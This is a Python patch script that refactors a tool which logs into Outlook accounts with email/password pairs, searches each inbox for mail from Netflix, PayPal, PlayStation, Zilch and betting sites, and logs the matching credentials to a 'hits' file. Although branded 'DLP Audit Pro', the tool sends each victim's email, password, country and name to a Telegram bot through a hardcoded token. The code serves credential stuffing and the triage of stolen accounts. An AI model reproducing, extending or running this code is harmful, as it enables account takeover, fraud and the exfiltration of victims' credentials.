import sys
import re

def refactor_server():
    with open("server.py", "r", encoding="utf-8") as f:
        content = f.read()

    # Replacement 1: Multi-user searches
    old_multi = """                # OPTIMIZATION: Combine all senders with OR to save proxies
                or_query = " OR ".join([f"from:{s}" for s in senders_list])
                final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                
                searches_to_run.append({
                    "username": d_uname,
                    "chat_id": d_chat_id,
                    "query": final_q,
                    "label": "MIS REMITENTES" if len(senders_list) > 1 else senders_list[0],
                    "is_multi": True
                })"""

    new_multi = """                # OPTIMIZATION: Combine senders in batches of 10
                chunk_size = 10
                for i in range(0, len(senders_list), chunk_size):
                    chunk = senders_list[i:i+chunk_size]
                    or_query = " OR ".join([f"from:{s}" for s in chunk])
                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                    
                    searches_to_run.append({
                        "username": d_uname,
                        "chat_id": d_chat_id,
                        "query": final_q,
                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
                        "is_multi": True,
                        "chunk": chunk
                    })"""

    if old_multi in content:
        content = content.replace(old_multi, new_multi)
    else:
        print("Failed to find old_multi in server.py")
        sys.exit(1)

    # Replacement 2: Single-user searches
    old_single = """                # OPTIMIZATION: Combine all senders with OR to save proxies
                or_query = " OR ".join([f"from:{s}" for s in senders_list])
                final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                
                searches_to_run.append({
                    "username": "Local Dashboard",
                    "chat_id": tg_chat_id,
                    "query": final_q,
                    "label": "MIS REMITENTES" if len(senders_list) > 1 else senders_list[0],
                    "is_multi": False
                })"""

    new_single = """                # OPTIMIZATION: Combine senders in batches of 10
                chunk_size = 10
                for i in range(0, len(senders_list), chunk_size):
                    chunk = senders_list[i:i+chunk_size]
                    or_query = " OR ".join([f"from:{s}" for s in chunk])
                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
                    
                    searches_to_run.append({
                        "username": "Local Dashboard",
                        "chat_id": tg_chat_id,
                        "query": final_q,
                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
                        "is_multi": False,
                        "chunk": chunk
                    })"""

    if old_single in content:
        content = content.replace(old_single, new_single)
    else:
        print("Failed to find old_single in server.py")
        sys.exit(1)

    # Replacement 3: Single-user empty sender (no chunk)
    old_empty = """            searches_to_run.append({
                "username": "Local Dashboard",
                "chat_id": tg_chat_id,
                "query": keyword,
                "label": keyword,
                "is_multi": False
            })"""

    new_empty = """            searches_to_run.append({
                "username": "Local Dashboard",
                "chat_id": tg_chat_id,
                "query": keyword,
                "label": keyword,
                "is_multi": False,
                "chunk": []
            })"""

    if old_empty in content:
        content = content.replace(old_empty, new_empty)
    else:
        print("Failed to find old_empty in server.py")
        sys.exit(1)


    # Replacement 4: The search loop block (using regex because it's massive)
    old_loop_pattern = r'    for search_task in searches_to_run:.*?emit_event\(q, "info", \{"message": f"✅ 0 mensajes — inbox limpio \(\{target_username\}\)"\}\)'

    new_loop = """    def run_outlook_search(query_string, username, is_silent=False):
        if not is_silent:
            emit_event(q, "step_start", {"step": 7, "name": f"Búsqueda: {query_string[:30]} ({username})"})
            emit_event(q, "info", {"message": f'Query [{username}]: "{query_string}"'})
        time.sleep(0.2)
        
        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": query_string},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": query_string},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 100,
                "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }

        t_found = 0
        s_ok = False

        try:
            res_search = session.post(
                "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                json=search_payload, headers=api_headers,
                verify=False, timeout=20
            )

            if not is_silent:
                emit_event(q, "info", {"message": f"Search HTTP: {res_search.status_code}"})

            if res_search.status_code == 200:
                data = res_search.json()
                for er in data.get("EntityResponses", []):
                    if er.get("EntityType") == "Conversation":
                        t_found = er.get("Total", 0)
                        break
                        
                if t_found == 0:
                    def find_total(obj):
                        if isinstance(obj, dict):
                            if "Total" in obj and isinstance(obj["Total"], int):
                                return obj["Total"]
                            for v in obj.values():
                                res = find_total(v)
                                if res is not None:
                                    return res
                        elif isinstance(obj, list):
                            for item in obj:
                                res = find_total(item)
                                if res is not None:
                                    return res
                        return None

                    found = find_total(data)
                    if found is not None:
                        t_found = found
                    else:
                        for es in data.get("EntitySets", []):
                            for rs in es.get("ResultSets", []):
                                results_list = rs.get("Results", [])
                                t_found += len(results_list)
                s_ok = True
            elif res_search.status_code == 401:
                emit_event(q, "warning", {"message": f"401 — token sin permiso [{username}]"})
            else:
                emit_event(q, "warning", {"message": f"Search HTTP {res_search.status_code} [{username}]"})
        except Exception as e:
            emit_event(q, "warning", {"message": f"Search error [{username}]: {str(e)[:80]}"})
            
        return t_found, s_ok

    def process_hit(chat_id, uname, s_label, s_query, t_found):
        nonlocal global_classification
        global_classification = "HIT"
        emit_event(q, "step_pass", {"step": 7, "detail": f"{t_found} msgs — {s_label} ({uname})"})
        emit_event(q, "dlp_result", {"total": t_found, "keyword": s_query, "sender": s_label})
        emit_event(q, "warning", {"message": f"🚨 {t_found} msgs encontrados: {s_query}"})
        
        try:
            gate_filename = "hits_encontrados.txt"
            with open(gate_filename, "a", encoding="utf-8") as gf:
                gf.write("="*40 + "\\n")
                gf.write(f"🎯 ALERTA MULTI-USER: Destinado para {uname}\\n")
                gf.write(f"🎯 OBJETIVO: {s_query}\\n")
                gf.write(f"📧 Correo: {email}\\n")
                gf.write(f"🔑 Pass: {password}\\n")
                gf.write(f"🌍 País: {country} | Nombre: {name}\\n")
                gf.write(f"📊 Total Encontrados: {t_found}\\n")
                gf.write("="*40 + "\\n\\n")
            emit_event(q, "info", {"message": f"💾 Gate guardado en {gate_filename}"})
        except Exception as e:
            emit_event(q, "warning", {"message": f"Error guardando gate: {e}"})

        TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
        if TELEGRAM_BOT_TOKEN and chat_id:
            friendly_names = {
                "info@account.netflix.com": "NETFLIX 🎬",
                "no_reply@vip.codere.com": "CODERE 🎰",
                "no-reply@mailer.caliente.mx": "CALIENTE 🔥",
                "noreply@zilch.com": "ZILCH 💳",
                "service@intl.paypal.com": "PAYPAL 💰",
                "reply@txn-email.playstation.com": "PLAYSTATION 🎮"
            }
            display_match = friendly_names.get(s_label.lower(), s_label)
            
            if hit_buffer is not None:
                hit_buffer.append({
                    "user": uname,
                    "match": display_match,
                    "email": email,
                    "pass": password,
                    "country": country,
                    "name": name,
                    "total": t_found,
                    "query": s_query,
                    "chat_id": chat_id
                })
                emit_event(q, "info", {"message": f"📦 HIT recolectado para reporte individual ({display_match})"})
            else:
                try:
                    tg_msg = (f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\\n━━━━━━━━━━━━━━━━━━\\n\\n"
                              f"👤 *Usuario:* `{uname}`\\n✅ *Match:* `{display_match}`\\n\\n"
                              f"📧 *Correo:* `{email}`\\n🔑 *Pass:* `{password}`\\n"
                              f"🌍 *País:* {country}\\n👤 *Nombre:* {name}\\n"
                              f"📊 *Mensajes:* `{t_found}`\\n🔍 *Búsqueda:* `{s_query}`\\n"
                              f"🤖 *DLP Audit Pro System*")
                    tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    http_requests.post(tg_url, json={"chat_id": chat_id, "text": tg_msg, "parse_mode": "Markdown"}, timeout=5)
                    emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {uname}"})
                except Exception as e:
                    emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {str(e)[:50]}"})

    for search_task in searches_to_run:
        target_username = search_task["username"]
        target_chat_id = search_task["chat_id"]
        search_q = search_task["query"]
        chunk = search_task.get("chunk", [])
        
        t_batch, s_ok = run_outlook_search(search_q, target_username, is_silent=False)
        
        if t_batch > 0:
            if chunk and len(chunk) > 1:
                emit_event(q, "info", {"message": f"🔍 {t_batch} detectados en grupo. Analizando individualmente para conteo exacto..."})
                for s in chunk:
                    indiv_q = f'from:{s} "{keyword}"' if keyword else f'from:{s}'
                    i_total, i_ok = run_outlook_search(indiv_q, target_username, is_silent=True)
                    if i_total > 0:
                        process_hit(target_chat_id, target_username, s, indiv_q, i_total)
            else:
                t_label = chunk[0] if chunk else search_task["label"]
                process_hit(target_chat_id, target_username, t_label, search_q, t_batch)
        else:
            emit_event(q, "info", {"message": f"✅ 0 mensajes — inbox limpio ({target_username})"})"""

    content = re.sub(old_loop_pattern, new_loop, content, flags=re.DOTALL)

    with open("server.py", "w", encoding="utf-8") as f:
        f.write(content)
    
    print("server.py updated successfully.")

def refactor_telethon():
    with open("telethon_listener.py", "r", encoding="utf-8") as f:
        content = f.read()

    old_report = """        for cat, items in categories.items():
            f.write(f"[{cat}]\\n")
            f.write("-" * 20 + "\\n")
            for h in items:
                line = f"{h['email']}:{h['pass']} | Pais: {h['country']} | Msgs: {h['total']}\\n"
                f.write(line)
            f.write("\\n")"""

    new_report = """        f.write(f"{'CORREO':<30} | {'CONTRASEÑA':<15} | {'HITS':<6} | {'PAÍS':<4} | {'OBJETIVO'}\\n")
        f.write("-" * 80 + "\\n")
        for cat, items in categories.items():
            for h in items:
                pwd = h['pass']
                if len(pwd) > 15: pwd = pwd[:12] + "..."
                f.write(f"{h['email']:<30} | {pwd:<15} | {str(h['total']):<6} | {h['country'][:4]:<4} | [{h['match']}]\\n")
        f.write("\\n")"""

    if old_report in content:
        content = content.replace(old_report, new_report)
        with open("telethon_listener.py", "w", encoding="utf-8") as f:
            f.write(content)
        print("telethon_listener.py updated successfully.")
    else:
        print("Failed to find old_report in telethon_listener.py")
        sys.exit(1)

if __name__ == "__main__":
    refactor_server()
    refactor_telethon()
